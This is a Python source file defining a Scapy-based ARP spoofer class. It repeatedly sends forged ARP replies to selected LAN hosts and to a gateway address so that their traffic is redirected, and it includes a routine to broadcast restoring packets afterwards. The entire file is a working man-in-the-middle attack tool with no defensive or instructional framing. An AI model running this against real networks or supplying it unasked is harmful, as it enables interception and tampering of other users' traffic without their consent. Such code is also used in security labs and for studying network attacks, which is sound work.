from scapy.all import ARP, send
import time
import threading

import Network.user as user


class ARP_spoofer:
    def __init__(self, interface, ip, mac):
        self.interface = interface
        self.ip = ip
        self.mac = mac

        self.isRunning = False

        self.user_set = set()

        self.interval = 2

    def add_user(self, user):
        self.user_set.add(user)
        user.isSpoofed = True

    def remove_user(self, user):
        user.isSpoofed = False
        self.user_set.discard(user)

    def start_spoofing(self):
        while self.isRunning:
            for user in self.user_set:
                self.send_spoofed_packets(user)
                

            time.sleep(self.interval)

    def start(self):
        thread = threading.Thread(target=self.start_spoofing, args=[])
        self.isRunning = True
        print('Running')

        thread.start()

    def stop(self):
        self.isRunning = False

    def send_spoofed_packets(self, user):
        spoofed_packets = [
            ARP(op=2, pdst=user.ip, psrc=self.ip, hwdst=self.mac),
            ARP(op=2, pdst=self.ip, psrc=user.ip, hwdst=user.mac)
        ]

        [send(x, verbose=0, iface=self.interface) for x in spoofed_packets]

    def restore_users(self, user):
        BROADCAST = '255.255.255.255'

        restore_packets = [
            ARP(op=2, pdst=user.ip, psrc=self.ip, hwdst=BROADCAST),
            ARP(op=2, pdst=self.ip, psrc=user.ip, hwdst=BROADCAST)
        ]

        [send(x, verbose=0, iface=self.interface) for x in restore_packets]
        print('Sending to ' + str(user))
